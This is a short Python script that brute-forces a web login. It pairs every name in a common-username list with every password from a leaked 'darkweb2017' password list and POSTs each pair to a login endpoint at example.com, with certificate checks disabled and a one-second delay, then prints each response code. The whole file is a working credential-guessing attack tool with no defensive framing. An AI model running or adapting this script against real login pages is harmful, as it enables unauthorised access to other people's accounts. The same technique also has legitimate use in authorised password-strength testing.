from itertools import product
from random import shuffle
from time import sleep

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


if __name__ == '__main__':
    with open('top-usernames-shortlist.txt', 'r') as f:
        username = f.readlines()

    with open('darkweb2017-top100.txt', 'r') as f:
        password = f.readlines()

    shuffle(username)
    shuffle(password)

    for user, pwd in product(username, password):
        resp = requests.post("https://www.example.com/cgi-bin/httpbin", data={
            'username': user,
            'password': pwd
        }, verify=False)
        print(f'{resp.request.method} {(user, pwd)} > {resp.status_code}')

        sleep(1)
